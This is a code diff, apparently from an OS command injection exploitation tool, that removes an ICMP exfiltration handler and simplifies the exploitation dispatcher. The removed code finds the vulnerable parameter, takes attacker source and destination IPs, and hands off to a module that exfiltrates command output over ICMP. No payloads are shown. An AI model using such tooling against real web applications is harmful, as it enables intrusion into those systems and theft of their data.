@@ -40,60 +40,6 @@ from src.core.injections.results_based.techniques.classic import cb_file_access
   The "classic" technique on Result-based OS Command Injection.
 """
 
-#-------------------------------------------------------
-# The "icmp exfiltration" injection technique handler.
-#-------------------------------------------------------
-def icmp_exfiltration_handler(url,http_request_method):
-  
-  # You need to have root privileges to run this script
-  if os.geteuid() != 0:
-    print colors.BGRED + "\n(x) Error:  You need to have root privileges to run this option.\n" + colors.RESET
-    sys.exit(0)
-    
-  if http_request_method == "GET":
-    # Check if its not specified the 'INJECT_HERE' tag
-    url = parameters.do_GET_check(url)
-    
-    # Define the vulnerable parameter
-    vuln_parameter = parameters.vuln_GET_param(url)
-    request_data = vuln_parameter
-
-  else:
-    parameter = menu.options.data
-    parameter = urllib2.unquote(parameter)
-    
-    # Check if its not specified the 'INJECT_HERE' tag
-    parameter = parameters.do_POST_check(parameter)
-    
-    # Define the vulnerable parameter
-    vuln_parameter = parameters.vuln_POST_param(parameter,url)
-    request_data = vuln_parameter
-    
-  ip_data = menu.options.ip_icmp_data
-  
-  # Load the module ICMP_Exfiltration
-  try:
-    from src.core.modules import ICMP_Exfiltration
-    
-  except ImportError as e:
-    print colors.BGRED + "(x) Error:",e
-    print colors.RESET
-    sys.exit(1)
-    
-  technique = "ICMP exfiltration technique"
-  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... \n" + colors.RESET)
-  sys.stdout.flush()
-  
-  ip_src =  re.findall(r"ip_src=(.*),",ip_data)
-  ip_src = ''.join(ip_src)
-  
-  ip_dst =  re.findall(r"ip_dst=(.*)",ip_data)
-  ip_dst = ''.join(ip_dst)
-  
-  ICMP_Exfiltration.exploitation(ip_dst,ip_src,url,http_request_method,request_data)
-
-
-
 #---------------------------------------------
 # The "classic" injection technique handler.
 #---------------------------------------------
@@ -320,12 +266,7 @@ def cb_injection_handler(url,delay,filename,http_request_method):
     sys.stdout.flush()
     
 def exploitation(url,delay,filename,http_request_method):
-  
-  # Use the ICMP Exfiltration technique
-  if menu.options.ip_icmp_data:
-    icmp_exfiltration_handler(url,http_request_method)
-  else:
-    if cb_injection_handler(url,delay,filename,http_request_method) == False:
-      return False
+  if cb_injection_handler(url,delay,filename,http_request_method) == False:
+    return False
 
 #eof
